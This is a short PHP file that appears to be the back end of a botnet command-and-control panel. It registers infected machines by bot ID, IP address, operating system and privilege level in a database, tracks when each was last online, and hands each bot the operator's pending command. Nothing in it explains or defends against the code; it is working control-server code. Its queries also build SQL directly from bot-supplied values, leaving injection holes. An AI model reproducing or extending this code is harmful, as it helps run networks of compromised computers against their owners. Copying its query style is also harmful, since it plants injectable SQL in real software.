<?php 

if ( !defined( "FILE" ) ) die( "Illegal File Access" );


function getip() 
{ 
    if ( getenv( "REMOTE_ADDR" ) && strcasecmp( getenv( "REMOTE_ADDR" ), "unknown" ) ) 
    { 
       $ip = getenv( "REMOTE_ADDR" );
    } 
    elseif ( !empty( $_SERVER['REMOTE_ADDR'] ) && strcasecmp( $_SERVER['REMOTE_ADDR'], "unknown" ) ) 
    { 
       $ip = $_SERVER['REMOTE_ADDR'];
    } 
    else 
    { 
       $ip = "0.0.0.0";
    } 
	
    return $ip;
} 


function get_command() 
{ 
    global $conf;
    $cmd = $conf['command'];
    return $cmd;
} 
 
function make_timeout() 
{ 
    global $conf;
	$time = time() - $conf['time_out'] * 60;
    return $time;
}


function get_bot( $bot_id, $version, $count, $os, $rs, $rq ) 
{ 
		 
    if(strcasecmp('', $os) == 0 )
    {
       $os = 'unknw';
    }

    $time = time();
    $bot_ip = getip();
    $last_cmd = get_command(); 
    $last_cmd = ( $last_cmd ) ? $last_cmd: "aHV5"; 
 
    list( $id, $last_online, $new, $command ) = mysql_fetch_array( mysql_query("SELECT id, last_online, new, command FROM bots WHERE id = '$bot_id' LIMIT 1" ) ); 
    //$last_cmd = ( $command ) ? $command: $last_cmd;
    if ( $id ) 
    { 
       if ( $last_cmd ) 
       { 
          $timeout = make_timeout();
          $timeout = $timeout - 60;
          if ( $last_online < $timeout || $new ) 
          { 
		     mysql_query( "UPDATE bots SET last_ip = '$bot_ip', last_online = '$time', new = '0', version = '$version', count = '$count', requests = '$rq', command = '' WHERE id = '$bot_id' LIMIT 1" );
             return $last_cmd;
          } 
          else 
          { 
             mysql_query( "UPDATE bots SET last_ip = '$bot_ip', last_online = '$time', count = '$count', requests = '$rq', version = '$version' WHERE id = '$bot_id' LIMIT 1" );
		     return $last_cmd;
		  } 
       } 
       else 
       { 
          mysql_query( "UPDATE bots SET last_ip = '$bot_ip', last_online = '$time', count = '$count', requests = '$rq', version = '$version' WHERE id = '$bot_id' LIMIT 1" );
       } 
    } 
    else 
    { 
       mysql_query( "INSERT INTO bots ( id, count, os, rights, requests, last_ip, last_online, new, version, regdate ) VALUES ( '$bot_id', '$count', '$os', '$rs', '$rq', '$bot_ip', '$time', '0', '$version', now() )" );
       return $last_cmd;
    } 
}
 
?>